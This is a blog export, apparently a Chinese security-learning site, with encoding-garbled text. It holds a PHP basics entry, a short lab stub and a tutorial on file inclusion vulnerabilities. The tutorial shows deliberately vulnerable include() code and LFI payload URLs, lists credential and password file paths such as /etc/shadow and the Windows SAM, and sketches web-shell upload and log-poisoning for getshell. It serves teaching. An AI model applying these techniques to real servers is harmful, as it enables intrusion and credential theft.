class="line">  <span class="variable">$y</span>=<span class="number">10.5</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨é‡Šï¼šå½“èµ‹å€¼ä¸€ä¸ªæ–‡æœ¬å€¼ç»™å˜é‡æ—¶ï¼Œè¯·åœ¨æ–‡æœ¬å€¼ä¸¤ä¾§åŠ ä¸Šå¼•å·ã€‚</strong></p><h2 id="PHPæ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€"><a href="#PHPæ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€" class="headerlink" title="PHPæ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€"></a>PHPæ˜¯ä¸€é—¨å¼±ç±»å‹è¯­è¨€</h2><p>åœ¨ä¸Šé¢çš„å®ä¾‹ä¸­ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ï¼Œä¸å¿…å‘phpå£°æ˜è¯¥å˜é‡çš„æ•°æ®ç±»å‹ã€‚phpä¼šæ ¹æ®å˜é‡çš„å€¼ï¼Œè‡ªåŠ¨æŠŠå˜é‡è½¬æ¢ä¸ºæ­£ç¡®çš„æ•°æ®ç±»å‹ã€‚åœ¨å¼ºç±»å‹çš„ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ä½¿ç”¨å‰å…ˆå£°æ˜(å®šä¹‰)å˜é‡çš„ç±»å‹å’Œåç§°ã€‚</p><h2 id="PHPå˜é‡ä½œç”¨åŸŸ"><a href="#PHPå˜é‡ä½œç”¨åŸŸ" class="headerlink" title="PHPå˜é‡ä½œç”¨åŸŸ"></a>PHPå˜é‡ä½œç”¨åŸŸ</h2><p>å˜é‡çš„ä½¿ç”¨åŸŸæ˜¯è„šæœ¬ä¸­å˜é‡å¯è¢«å¼•ç”¨/ä½¿ç”¨çš„éƒ¨åˆ†ã€‚</p><blockquote><p>PHPæœ‰å››ç§ä¸åŒçš„å˜é‡ä½œç”¨åŸŸï¼š</p><p>1.local</p><p>2.global</p><p>3.static</p><p>4.parmeter</p></blockquote><p><strong>å±€éƒ¨å’Œå…¨å±€ä½œç”¨åŸŸ</strong></p><p>åœ¨æ‰€æœ‰å‡½æ•°å¤–éƒ¨å®šä¹‰çš„å˜é‡ï¼Œæ‹¥æœ‰å…¨å±€ä½œç”¨åŸŸã€‚é™¤äº†å‡½æ•°å¤–ï¼Œå…¨å±€å˜é‡å¯ä»¥è¢«è„šæœ¬ä¸­çš„ä»»ä½•éƒ¨åˆ†è®¿é—®ï¼Œè¦åœ¨ä¸€ä¸ªå‡½æ•°ä¸­è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œéœ€è¦ä½¿ç”¨globalå…³é”®å­—ã€‚</p><p>åœ¨PHPå‡½æ•°å†…éƒ¨å£°æ˜çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼Œä»…èƒ½åœ¨å‡½æ•°å†…éƒ¨è®¿é—®ï¼š</p>]]></content>
      
      
      <categories>
          
          <category> phpåŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ifi-labsé¶åœº</title>
      <link href="/2023/08/03/Ifi-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/08/03/Ifi-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>CMD-1</p><p>æ‰“å¼€é¡µé¢ï¼Œæ˜¾ç¤ºä¸€ä¸ªè­¦å‘Šè¡¨ç¤ºsystem()ä¸èƒ½æ‰§è¡Œç©ºç™½å‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´åå°å­˜åœ¨system()çš„è°ƒç”¨ï¼Œ</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´é¶åœºå­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«</title>
      <link href="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°"></a>æ–‡ä»¶åŒ…å«æ¼æ´æ¦‚è¿°</h2><h3 id="ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«ï¼Ÿ</h3><p>ç¨‹åºå¼€å‘äººå‘˜é€šå¸¸ä¼šæŠŠå¯é‡å¤ä½¿ç”¨çš„å‡½æ•°å†™åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ä½¿ç”¨æŸä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶ï¼Œæ— éœ€å†æ¬¡ç¼–å†™ï¼Œè¿™ç§è°ƒç”¨æ–‡ä»¶çš„è¿‡ç¨‹é€šå¸¸ç§°ä¸ºåŒ…å«ã€‚</p><h3 id="æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”ŸåŸç†"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”ŸåŸç†" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”ŸåŸç†"></a>æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”ŸåŸç†</h3><p>æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„<code>å‚æ•°æ²¡æœ‰ç»è¿‡ä¸¥æ ¼è¿‡æ»¤æˆ–ä¸¥æ ¼å®šä¹‰</code>ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼ŒåŒ…å«å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´æ‰§è¡Œäº†éé¢„æœŸä»£ç ã€‚</p><p>è¿™ç§åŒ…å«å¯ä»¥æ˜¯ä»£ç æ›´åŠ çµæ´»ï¼Œæ‰€ä»¥é€šå¸¸ä¼šæŠŠè¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œä½†æ­£æ˜¯ç”±äºè¿™ç§çµæ´»æ€§ï¼Œä»è€Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥è°ƒç”¨ä»»æ„æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><h4 id="1-å¸¸è§çš„æ¼æ´ä»£ç "><a href="#1-å¸¸è§çš„æ¼æ´ä»£ç " class="headerlink" title="1.å¸¸è§çš„æ¼æ´ä»£ç "></a>1.å¸¸è§çš„æ¼æ´ä»£ç </h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">   <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">   <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-è®¿é—®-url"><a href="#2-è®¿é—®-url" class="headerlink" title="2.è®¿é—®  url"></a>2.è®¿é—®  url</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/xxx.php?filename=show.php</span><br><span class="line"></span><br><span class="line">æ”¹å˜filenameå€¼å³å¯æ”¹å˜ä»£ç ä¸­çš„åŒ…å«æ–‡ä»¶</span><br></pre></td></tr></table></figure><p><code>$_GET[&#39;filename&#39;]</code>å‚æ•°ï¼Œå¦‚æœå¼€å‘è€…æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œç›´æ¥å¸¦å…¥äº†includeçš„å‡½æ•°ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹<code>$_GET[&#39;filename&#39;]</code>çš„å€¼ï¼Œæ‰§è¡Œéé¢„æœŸçš„æ“ä½œã€‚</p><p>show.phpå³å¯ä¸ºç”¨æˆ·ä¸Šä¼ çš„å¯æ‰§è¡Œçš„æ¶æ„è„šæœ¬æ–‡ä»¶</p><p>åŒ…å«æ–‡ä»¶å†…å®¹åªè¦ç¬¦åˆphpè¯­æ³•éƒ½èƒ½è¢«å½“æˆphpä»£ç è¿›è¡Œè§£æï¼Œæ— å…³åç¼€åæ˜¯ä»€ä¹ˆã€‚</p><h5 id="phpç›¸å…³é…ç½®"><a href="#phpç›¸å…³é…ç½®" class="headerlink" title="phpç›¸å…³é…ç½®"></a>phpç›¸å…³é…ç½®</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line"><span class="comment">// æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI)ï¼Œä½†è¿™ä¸ªæ— è®ºonæˆ–offï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«éƒ½å­˜åœ¨</span></span><br><span class="line"></span><br><span class="line">allow_url_include=on</span><br><span class="line"><span class="comment">//  è¿œç¨‹æ–‡ä»¶åŒ…å«(RFI)</span></span><br></pre></td></tr></table></figure><p>3.æ¼æ´æˆå› åˆ†æ</p><p>ä¸¾ä¸ªä¾‹å­</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨åˆ›å»ºä¸€ä¸ªphpinfo.phpé¡µé¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼Œincludeå‡½æ•°æ¥æ‰§è¡Œphpinfo.phpé¡µé¢ï¼ŒæˆåŠŸè¢«è§£æ</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230802215646419.png" alt="image-20230802215646419"></p><p>å°†ç½‘ç«™æ–‡ä»¶çš„phpinfo.phpæ–‡ä»¶åç¼€æ”¹ä¸ºtxtåï¼Œä¿®æ”¹urlè¿›è¡Œè®¿é—®ï¼Œä¹Ÿå¯ä»¥è§£æ</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230802220129455.png" alt="image-20230802220129455"></p><p>å°†ç½‘ç«™æ–‡ä»¶çš„phpinfo.phpæ–‡ä»¶åç¼€æ”¹ä¸ºjpgåï¼Œä¿®æ”¹urlè¿›è¡Œè®¿é—®</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230802220258739.png" alt="image-20230802220258739"></p><p>æ€è€ƒï¼šphpæ–‡ä»¶åŒ…å«ï¼Œä¸ºä»€ä¹ˆåŒ…å«ä»»æ„æ ¼å¼çš„æ–‡ä»¶éƒ½è¢«å½“åšPHPæ–‡ä»¶æ‰§è¡Œã€‚</p><blockquote><p><strong>phpæ–‡ä»¶åŒ…å«ä¸»è¦ç”±è¿™å››ä¸ªå‡½æ•°å®Œæˆï¼šinclude(), require(), include_once(), require_once()ã€‚å½“ä½¿ç”¨è¿™4ä¸ªå‡½æ•°åŒ…å«ä¸€ä¸ªæ–°çš„æ–‡ä»¶æ—¶ï¼Œè¯¥æ–‡ä»¶ä½œä¸ºphpä»£ç æ‰§è¡Œï¼Œphpå†…æ ¸å¹¶ä¸ä¼šåœ¨æ„è¯¥è¢«åŒ…å«æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ã€‚æ‰€ä»¥å¦‚æœè¢«åŒ…å«çš„æ˜¯txtæ–‡ä»¶ï¼Œå›¾ç‰‡æ–‡ä»¶ã€è¿œç¨‹urlï¼Œéƒ½ä¼šè¢«å½“æˆphpä»£ç æ‰§è¡Œã€‚</strong></p></blockquote><h4 id="3-å­˜åœ¨æ–‡ä»¶åŒ…å«çš„è„šæœ¬è¯­è¨€åŠå‡½æ•°"><a href="#3-å­˜åœ¨æ–‡ä»¶åŒ…å«çš„è„šæœ¬è¯­è¨€åŠå‡½æ•°" class="headerlink" title="3.å­˜åœ¨æ–‡ä»¶åŒ…å«çš„è„šæœ¬è¯­è¨€åŠå‡½æ•°"></a>3.å­˜åœ¨æ–‡ä»¶åŒ…å«çš„è„šæœ¬è¯­è¨€åŠå‡½æ•°</h4><ul><li><p>php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require:å‡½æ•°å‡ºç°é”™è¯¯æ—¶ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºæ‰§è¡Œ</span><br><span class="line">require_once:å‡ºé”™ç›´æ¥é€€å‡ºï¼Œä¸”ä»…åŒ…å«ä¸€æ¬¡ã€‚åœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒä¸€ä¸ªæ–‡ä»¶å¯èƒ½è¢«å¤šæ¬¡ä½¿ç”¨ï¼Œç¡®ä¿åŒ…å«ä¸€æ¬¡ä»¥é¿å…å‡½æ•°é‡æ–°å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ã€‚</span><br><span class="line">include:å‡ºç°é”™è¯¯æ—¶ï¼Œä¼šå‡ºç°è­¦å‘Šä½†æ˜¯ç¨‹åºä¼šç»§ç»­æ‰§è¡Œ</span><br><span class="line">include_once:å‡ºç°é”™è¯¯æ—¶ï¼Œä¼šæŠ›å‡ºè­¦å‘Šï¼Œä¸”ä»…åŒ…å«ä¸€æ¬¡</span><br></pre></td></tr></table></figure></li></ul><p>é”™è¯¯æ˜¯ä»€ä¹ˆï¼Ÿ</p><blockquote><p>ä¸¤ä¸ªå‡½æ•°å‘ç”Ÿé”™è¯¯ï¼ŒæŒ‡çš„æ˜¯åŒ…å«çš„æ–‡ä»¶ä¸å­˜åœ¨æ—¶ï¼Œè€Œä¸æ˜¯åŒ…å«çš„æ–‡ä»¶å†…å®¹æœ‰é—®é¢˜å¯¼è‡´phpä»£ç è§£ææŠ¥é”™ï¼Œè¿™ç§æŠ¥é”™ä¸¤ä¸ªå‡½æ•°éƒ½ä¼šä¸­æ–­ç¨‹åº</p><p>requireåœ¨è¿™ç§æƒ…å†µä¼šä¸­æ–­ç¨‹åº</p><p>includeåœ¨è¿™ç§æƒ…å†µä¼šç»§ç»­æ‰§è¡Œç¨‹åº</p></blockquote><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><h5 id="require"><a href="#require" class="headerlink" title="require"></a>require</h5><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">require</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phptest/index.php?file=h.php</span><br></pre></td></tr></table></figure><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230802155056325.png" alt="image-20230802155056325"></p><p>ç”±äºh.phpæ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ‰€ä»¥å½“æ‰§è¡Œåˆ°require â€™h.phpâ€˜;è¿™ä¸€è¡Œæ—¶ï¼Œç¨‹åºä¼šä¸­æ–­æ‰§è¡Œï¼Œå¹¶è¿”å›ä¸€ä¸ªè‡´å‘½é”™è¯¯ã€‚</p><h5 id="include"><a href="#include" class="headerlink" title="include"></a>include</h5><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phptest/index.php?file=h.php</span><br></pre></td></tr></table></figure><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230802155426189.png" alt="image-20230802155426189"></p><p>ç”±äºh.phpæ–‡ä»¶ä¸å­˜åœ¨ï¼Œæ‰€ä»¥å½“æ‰§è¡Œinclude â€™h.phpâ€˜;ç¨‹åºä¼šç»§ç»­æ‰§è¡Œï¼Œå¹¶è¿”å›ä¸€ä¸ªè­¦å‘Šï¼Œæœ€ç»ˆé¡µé¢ä¸Šä¼šæ˜¾ç¤ºâ€œhello worldâ€</p><hr><ul><li><p>jsp/servlet</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.io.<span class="title function_ invoke__">file</span>()</span><br><span class="line">java.io.<span class="title function_ invoke__">filereader</span>()</span><br></pre></td></tr></table></figure></li><li><p>asp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> file</span><br><span class="line"><span class="keyword">include</span> virtual</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="4-æ–‡ä»¶åŒ…å«æ¼æ´çš„å±å®³"><a href="#4-æ–‡ä»¶åŒ…å«æ¼æ´çš„å±å®³" class="headerlink" title="4.æ–‡ä»¶åŒ…å«æ¼æ´çš„å±å®³"></a>4.æ–‡ä»¶åŒ…å«æ¼æ´çš„å±å®³</h4><ol><li><p>æ•æ„Ÿä¿¡æ¯æ³„éœ²</p></li><li><p>è·å–ç½‘ç«™æƒé™(webshell)</p></li><li><p>ä»»æ„å‘½ä»¤æ‰§è¡Œ</p></li></ol><h1 id="æ–‡ä»¶åŒ…å«æ¼æ´ç±»å‹"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´ç±»å‹" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´ç±»å‹"></a>æ–‡ä»¶åŒ…å«æ¼æ´ç±»å‹</h1><h3 id="æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´-LFI"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´-LFI" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(LFI)</h3><p>èƒ½å¤Ÿè¯»å–æ‰§è¡ŒåŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><p>åŒ…å«æœåŠ¡å™¨æœ¬èº«å­˜åœ¨çš„æ¶æ„æ–‡ä»¶</p><p>a.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>b.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$b</span>);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/phptest/b.php?id=a.txt</span><br><span class="line">è¿”å›phpinfoé¡µé¢</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼š</p><ul><li><p>ä¸¤ä¸ªæ–‡ä»¶åœ¨åŒä¸€ç›®å½•ä¸‹ï¼ˆè‹¥ä¸åœ¨åŒä¸€ç›®å½•è¿™è¢«åŒ…å«çš„æ–‡ä»¶è·¯å¾„å¿…é¡»å†™ç»å¯¹è·¯å¾„æˆ–ç›¸å¯¹è·¯å¾„ï¼‰</p><p>ï¼ˆç›¸å¯¹è·¯å¾„./å½“å‰ç›®å½•../ä¸Šçº§ç›®å½•ï¼‰</p></li><li><p>è¢«åŒ…å«çš„é¡µé¢çš„<code>åç¼€åæ— è®ºæ˜¯ä»€ä¹ˆ</code>éƒ½ä¼šå½“åšphpè§£æ</p></li></ul><p> èƒ½å¤Ÿæ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç½‘ç«™åˆ©ç”¨æ–‡ä»¶åŒ…å«åŠŸèƒ½è¯»å–ä¸€äº›phpæ–‡ä»¶ï¼Œä¾‹å¦‚phpinfoï¼š</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230803110437948.png" alt="image-20230803110437948"></p><p>åˆ©ç”¨è¯¥ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–ä¸€äº›ç³»ç»Ÿæœ¬åœ°çš„æ•æ„Ÿä¿¡æ¯ã€‚</p><p>ä¾‹å¦‚ï¼š<code>C:\Windows\system.ini</code>æ–‡ä»¶</p><p>(1)ä½¿ç”¨ç»å¯¹è·¯å¾„</p><p>ä½¿ç”¨<code>ç»å¯¹è·¯å¾„</code>ç›´æ¥è¯»å–ï¼š</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230803111922763.png" alt="image-20230803111922763"></p><p>(2)ä½¿ç”¨ç›¸å¯¹è·¯å¾„è¯»å–</p><p>é€šè¿‡ ./è¡¨ç¤ºå½“å‰ä½ç½®è·¯å¾„ï¼Œ ../è¡¨ç¤ºä¸Šä¸€çº§è·¯å¾„ä½ç½®,åœ¨linuxä¸­åŒæ ·é€‚ç”¨ã€‚</p><p>ä¾‹å¦‚</p><p><code>../../Windows/system.ini</code></p><p>(3)ä¸€äº›å¸¸è§çš„æ•æ„Ÿç›®å½•ä¿¡æ¯è·¯å¾„ï¼š</p><p>Windowsç³»ç»Ÿï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini    //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml //IISé…ç½®æ–‡ä»¶</span><br><span class="line">C:\windows\repair\sam //å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </span><br><span class="line">C:\ProgramFiles\mysql\my.ini //Mysqlé…ç½®</span><br><span class="line">C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL rootå¯†ç </span><br><span class="line">C:\windows\php.ini //phpé…ç½®ä¿¡æ¯</span><br></pre></td></tr></table></figure><p>linuxç³»ç»Ÿï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/password //è´¦æˆ·ä¿¡æ¯</span><br><span class="line">/etc/shadow //è´¦æˆ·å¯†ç ä¿¡æ¯</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf //Apache2é»˜è®¤é…ç½®æ–‡ä»¶</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf //è™šæ‹Ÿç½‘ç«™é…ç½®</span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHPç›¸å…³é…ç½®</span><br><span class="line">/etc/httpd/conf/httpd.conf //Apacheé…ç½®æ–‡ä»¶</span><br><span class="line">/etc/my.conf //mysqlé…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure><h3 id="LFIæ¼æ´åˆ©ç”¨æŠ€å·§"><a href="#LFIæ¼æ´åˆ©ç”¨æŠ€å·§" class="headerlink" title="LFIæ¼æ´åˆ©ç”¨æŠ€å·§"></a>LFIæ¼æ´åˆ©ç”¨æŠ€å·§</h3><h4 id="1-é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨"><a href="#1-é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨" class="headerlink" title="1.é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨"></a>1.é…åˆæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨</h4><p>å½“ç½‘ç«™ä¸Šä¼ ç‚¹ï¼Œåªé™åˆ¶å›¾ç‰‡ç±»å‹ï¼Œä¸”æ— æ³•ç»•è¿‡ï¼Œä¸èƒ½åˆ©ç”¨.htaccessè¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯å¯¹å›¾ç‰‡å†…å®¹æ²¡æœ‰è¿›è¡Œè¿‡æ»¤</p><p>å¯ä»¥è€ƒè™‘</p><blockquote><p>1.ä¸Šä¼ å›¾ç‰‡ğŸåŒ…å«ä¸€å¥è¯æœ¨é©¬å†…å®¹</p><p>2.æ‰¾åˆ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒåŒ…å«ä¸Šä¼ å›¾ç‰‡ğŸï¼Œåˆ©ç”¨includeè§£æä»»æ„æ–‡ä»¶ä¸ºphpï¼Œæ¥å®ç°getshell</p></blockquote><h4 id="2-åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶"><a href="#2-åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶" class="headerlink" title="2.åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶"></a>2.åŒ…å«Apacheæ—¥å¿—æ–‡ä»¶</h4><p>æœ‰æ—¶å€™ç½‘ç«™å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†æ˜¯å´æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡åˆ©ç”¨Apacheçš„æ—¥å¿—æ–‡ä»¶æ¥ç”Ÿæˆä¸€å¥è¯æœ¨é©¬ã€‚</p><p>åˆ©ç”¨çš„æ¡ä»¶</p><ul><li>å¯¹æ—¥å¿—æ–‡ä»¶å¯è¯»</li><li>çŸ¥é“æ—¥å¿—æ–‡ä»¶å­˜å‚¨ç›®å½•</li></ul><p>æ³¨æ„</p><ul><li>ä¸€èˆ¬æƒ…å†µä¸‹æ—¥å¿—å­˜å‚¨ç›®å½•ä¼šè¢«ä¿®æ”¹ï¼Œéœ€è¦è¯»å–æœåŠ¡å™¨é…ç½®æ–‡ä»¶(httpd.conf,nginx.confâ€¦)æˆ–è€…æ 